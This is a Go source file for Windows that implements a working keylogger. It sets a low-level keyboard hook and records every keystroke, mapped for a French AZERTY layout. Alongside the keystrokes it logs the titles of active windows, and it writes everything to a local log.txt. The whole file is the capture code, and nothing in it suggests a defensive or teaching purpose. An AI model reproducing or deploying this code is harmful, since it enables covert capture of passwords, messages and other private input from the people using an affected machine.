package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
	"github.com/AllenDang/w32"
	"golang.org/x/sys/windows/registry"
	"log"
	"strconv"
	"time"
	"os"
	)

var (
	user32 = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookEx = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage = user32.NewProc("GetMessageW")
	procGetKeyState = user32.NewProc("GetKeyState")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW = user32.NewProc("GetWindowTextW")
	keyboardHook HHOOK
	tmpKeylog string
)
const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN = 256
	WM_SYSKEYUP = 261
	/*WH_KEYBOARD = 2
	WM_SYSKEYDOWN = 260
	WM_KEYUP = 257
	WM_KEYFIRST = 256
	WM_KEYLAST = 264
	PM_NOREMOVE = 0x000
	PM_REMOVE = 0x001
	PM_NOYIELD = 0x002
	WM_LBUTTONDOWN = 513
	WM_RBUTTONDOWN = 516
	NULL = 0*/
)

type (
	DWORD uint32
	WPARAM uintptr
	LPARAM uintptr
	LRESULT uintptr
	HANDLE uintptr
	HINSTANCE HANDLE
	HHOOK HANDLE
	HWND HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

type KBDLLHOOKSTRUCT struct {
	VkCode DWORD
	ScanCode DWORD
	Flags DWORD
	Time DWORD
	DwExtraInfo uintptr
}

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd HWND
	Message uint32
	WParam uintptr
	LParam uintptr
	Time uint32
	Pt POINT
}

func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := procSetWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	var tmpTitle string
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				tmpKeylog += string("\n\n[" + syscall.UTF16ToString(b) + "]\r\n")
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func keylogger(file *os.File) {
	var msg MSG
	CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	var SHIFT uintptr
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
			if nCode == 0 && wparam == WM_KEYDOWN {
				SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_LSHIFT))
				if SHIFT == 32769 || SHIFT == 32768{
					SHIFT=1
				}
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := byte(kbdstruct.VkCode)
				switch code {
				case w32.VK_CONTROL:
					tmpKeylog += "[Ctrl]"
				case w32.VK_BACK:
					tmpKeylog += "[Back]"
				case w32.VK_TAB:
					tmpKeylog += "[Tab]"
				case w32.VK_RETURN:
					tmpKeylog += "[Enter]\r\n"
				case w32.VK_SHIFT:
					tmpKeylog += "[Shift]"
				case w32.VK_MENU:
					tmpKeylog += "[Alt]"
				case w32.VK_CAPITAL:
					if CAPS==1{
						CAPS=0
					}else{
						CAPS=1
					}
				case w32.VK_ESCAPE:
					tmpKeylog += "[Esc]"
				case w32.VK_SPACE:
					tmpKeylog += " "
				case w32.VK_PRIOR:
					tmpKeylog += "[PageUp]"
				case w32.VK_NEXT:
					tmpKeylog += "[PageDown]"
				case w32.VK_END:
					tmpKeylog += "[End]"
				case w32.VK_HOME:
					tmpKeylog += "[Home]"
				case w32.VK_LEFT:
					tmpKeylog += "[Left]"
				case w32.VK_UP:
					tmpKeylog += "[Up]"
				case w32.VK_RIGHT:
					tmpKeylog += "[Right]"
				case w32.VK_DOWN:
					tmpKeylog += "[Down]"
				case w32.VK_SELECT:
					tmpKeylog += "[Select]"
				case w32.VK_PRINT:
					tmpKeylog += "[Print]"
				case w32.VK_EXECUTE:
					tmpKeylog += "[Execute]"
				case w32.VK_SNAPSHOT:
					tmpKeylog += "[PrintScreen]"
				case w32.VK_INSERT:
					tmpKeylog += "[Insert]"
				case w32.VK_DELETE:
					tmpKeylog += "[Delete]"
				case w32.VK_HELP:
					tmpKeylog += "[Help]"
				case w32.VK_LWIN:
					tmpKeylog += "[LeftWindows]"
				case w32.VK_RWIN:
					tmpKeylog += "[RightWindows]"
				case w32.VK_APPS:
					tmpKeylog += "[Applications]"
				case w32.VK_SLEEP:
					tmpKeylog += "[Sleep]"
				case w32.VK_NUMPAD0:
					tmpKeylog += "0"
				case w32.VK_NUMPAD1:
					tmpKeylog += "1"
				case w32.VK_NUMPAD2:
					tmpKeylog += "2"
				case w32.VK_NUMPAD3:
					tmpKeylog += "3"
				case w32.VK_NUMPAD4:
					tmpKeylog += "4"
				case w32.VK_NUMPAD5:
					tmpKeylog += "5"
				case w32.VK_NUMPAD6:
					tmpKeylog += "6"
				case w32.VK_NUMPAD7:
					tmpKeylog += "7"
				case w32.VK_NUMPAD8:
					tmpKeylog += "8"
				case w32.VK_NUMPAD9:
					tmpKeylog += "9"
				case w32.VK_MULTIPLY:
					tmpKeylog += "*"
				case w32.VK_ADD:
					tmpKeylog += "+"
				case w32.VK_SEPARATOR:
					tmpKeylog += "[Separator]"
				case w32.VK_SUBTRACT:
					tmpKeylog += "-"
				case w32.VK_DECIMAL:
					tmpKeylog += "."
				case w32.VK_DIVIDE:
					tmpKeylog += "[Devide]"
				case w32.VK_F1:
					tmpKeylog += "[F1]"
				case w32.VK_F2:
					tmpKeylog += "[F2]"
				case w32.VK_F3:
					tmpKeylog += "[F3]"
				case w32.VK_F4:
					tmpKeylog += "[F4]"
				case w32.VK_F5:
					tmpKeylog += "[F5]"
				case w32.VK_F6:
					tmpKeylog += "[F6]"
				case w32.VK_F7:
					tmpKeylog += "[F7]"
				case w32.VK_F8:
					tmpKeylog += "[F8]"
				case w32.VK_F9:
					tmpKeylog += "[F9]"
				case w32.VK_F10:
					tmpKeylog += "[F10]"
				case w32.VK_F11:
					tmpKeylog += "[F11]"
				case w32.VK_F12:
					tmpKeylog += "[F12]"
				case w32.VK_NUMLOCK:
					tmpKeylog += "[NumLock]"
				case w32.VK_SCROLL:
					tmpKeylog += "[ScrollLock]"
				/*case w32.VK_LSHIFT:
					tmpKeylog += "[LeftShift]"
				case w32.VK_RSHIFT:
					tmpKeylog += "[RightShift]"*/
				case w32.VK_LCONTROL:
					tmpKeylog += "[Ctrl]"
				case w32.VK_RCONTROL:
					tmpKeylog += "[Ctrl]"
				case w32.VK_LMENU:
					tmpKeylog += "[Alt]"
				case w32.VK_RMENU:
					tmpKeylog += "[RightMenu]"

				case w32.VK_OEM_7:
					tmpKeylog += "²"
				}
				if SHIFT==1{
					CAPS2 = 1
				}else{
					CAPS2 = 0
				}
				if (CAPS==0 && CAPS2==0) || (CAPS==1 && CAPS2==1 ){
					switch code{
					case 0x41:
						tmpKeylog += "a"
					case 0x42:
						tmpKeylog += "b"
					case 0x43:
						tmpKeylog += "c"
					case 0x44:
						tmpKeylog += "d"
					case 0x45:
						tmpKeylog += "e"
					case 0x46:
						tmpKeylog += "f"
					case 0x47:
						tmpKeylog += "g"
					case 0x48:
						tmpKeylog += "h"
					case 0x49:
						tmpKeylog += "i"
					case 0x4A:
						tmpKeylog += "j"
					case 0x4B:
						tmpKeylog += "k"
					case 0x4C:
						tmpKeylog += "l"
					case 0x4D:
						tmpKeylog += "m"
					case 0x4E:
						tmpKeylog += "n"
					case 0x4F:
						tmpKeylog += "o"
					case 0x50:
						tmpKeylog += "p"
					case 0x51:
						tmpKeylog += "q"
					case 0x52:
						tmpKeylog += "r"
					case 0x53:
						tmpKeylog += "s"
					case 0x54:
						tmpKeylog += "t"
					case 0x55:
						tmpKeylog += "u"
					case 0x56:
						tmpKeylog += "v"
					case 0x57:
						tmpKeylog += "w"
					case 0x58:
						tmpKeylog += "x"
					case 0x59:
						tmpKeylog += "y"
					case 0x5A:
						tmpKeylog += "z"
					case 0x30:
						tmpKeylog += "à"
					case 0x31:
						tmpKeylog += "&"
					case 0x32:
						tmpKeylog += "é"
					case 0x33:
						tmpKeylog += "\""
					case 0x34:
						tmpKeylog += "'"
					case 0x35:
						tmpKeylog += "("
					case 0x36:
						tmpKeylog += "-"
					case 0x37:
						tmpKeylog += "è"
					case 0x38:
						tmpKeylog += "_"
					case 0x39:
						tmpKeylog += "ç"
					case 0xbc:
						tmpKeylog += ","
					case w32.VK_OEM_1:
						tmpKeylog += "$"
					case w32.VK_OEM_2:
						tmpKeylog += ":"
					case w32.VK_OEM_3:
						tmpKeylog += "ù"
					case w32.VK_OEM_4:
						tmpKeylog += ")"
					case w32.VK_OEM_6:
						tmpKeylog += "^"
					case w32.VK_OEM_PERIOD:
						tmpKeylog += ";"
					case 0xbb:
						tmpKeylog += "="
					case 0xdf:
						tmpKeylog += "!"
					case w32.VK_OEM_5:
						tmpKeylog += "*"
					}
				}else {
					switch code {
					case 0x41:
						tmpKeylog += "A"
					case 0x42:
						tmpKeylog += "B"
					case 0x43:
						tmpKeylog += "C"
					case 0x44:
						tmpKeylog += "D"
					case 0x45:
						tmpKeylog += "E"
					case 0x46:
						tmpKeylog += "F"
					case 0x47:
						tmpKeylog += "G"
					case 0x48:
						tmpKeylog += "H"
					case 0x49:
						tmpKeylog += "I"
					case 0x4A:
						tmpKeylog += "J"
					case 0x4B:
						tmpKeylog += "K"
					case 0x4C:
						tmpKeylog += "L"
					case 0x4D:
						tmpKeylog += "M"
					case 0x4E:
						tmpKeylog += "N"
					case 0x4F:
						tmpKeylog += "O"
					case 0x50:
						tmpKeylog += "P"
					case 0x51:
						tmpKeylog += "Q"
					case 0x52:
						tmpKeylog += "R"
					case 0x53:
						tmpKeylog += "S"
					case 0x54:
						tmpKeylog += "T"
					case 0x55:
						tmpKeylog += "U"
					case 0x56:
						tmpKeylog += "V"
					case 0x57:
						tmpKeylog += "W"
					case 0x58:
						tmpKeylog += "X"
					case 0x59:
						tmpKeylog += "Y"
					case 0x5A:
						tmpKeylog += "Z"
					case 0x30:
						tmpKeylog += "0"
					case 0x31:
						tmpKeylog += "1"
					case 0x32:
						tmpKeylog += "2"
					case 0x33:
						tmpKeylog += "3"
					case 0x34:
						tmpKeylog += "4"
					case 0x35:
						tmpKeylog += "5"
					case 0x36:
						tmpKeylog += "6"
					case 0x37:
						tmpKeylog += "7"
					case 0x38:
						tmpKeylog += "8"
					case 0x39:
						tmpKeylog += "9"
					case 0xbc:
						tmpKeylog += "?"
					case w32.VK_OEM_1:
						tmpKeylog += "£"
					case w32.VK_OEM_2:
						tmpKeylog += "/"
					case w32.VK_OEM_3:
						tmpKeylog += "%"
					case w32.VK_OEM_4:
						tmpKeylog += "°"
					case w32.VK_OEM_6:
						tmpKeylog += "¨"
					case w32.VK_OEM_PERIOD:
						tmpKeylog += "."
					case 0xbb:
						tmpKeylog += "+"
					case 0xdf:
						tmpKeylog += "§"
					case w32.VK_OEM_5:
						tmpKeylog += "µ"
					}
				}

			}else if wparam == WM_SYSKEYUP {
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := byte(kbdstruct.VkCode)
				switch code{
				case 50:
					tmpKeylog += "~"
				case 51:
					tmpKeylog += "#"
				case 52:
					tmpKeylog += "{"
				case 53:
					tmpKeylog += "["
				case 54:
					tmpKeylog += "|"
				case 55:
					tmpKeylog += "`"
				case 56:
					tmpKeylog += "\\"
				case 57:
					tmpKeylog += "^"
				case 48:
					tmpKeylog += "@"
				case 219:
					tmpKeylog += "]"
				case 187:
					tmpKeylog += "}"
				}
			}
			fmt.Printf("%s\n", tmpKeylog)
			//fmt.Printf("%d\n", code)
			file.WriteString(tmpKeylog)
			tmpKeylog=""
			return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
		}), 0, 0)


	for GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(1*time.Millisecond)
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

func getKeyboardLayout() uint64{
	k, err := registry.OpenKey(registry.CURRENT_USER, `Keyboard Layout\Preload`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	s, _, err := k.GetStringValue("1")
	if err != nil {
		log.Fatal(err)
	}
	result,_ := strconv.ParseUint(s,16,32)
	return result
}

func main() {
	if getKeyboardLayout()!=0x40c{
		fmt.Println("Keyboard layout is not AZERTY, it will not work properly !!! ")
	}
	file, err := os.Create("log.txt")
	if err != nil {
		log.Fatal("Cannot create file", err)
	}
	defer file.Close()
	go windowLogger()
	go keylogger(file)
	for {
		time.Sleep(1*time.Millisecond)
	}
}
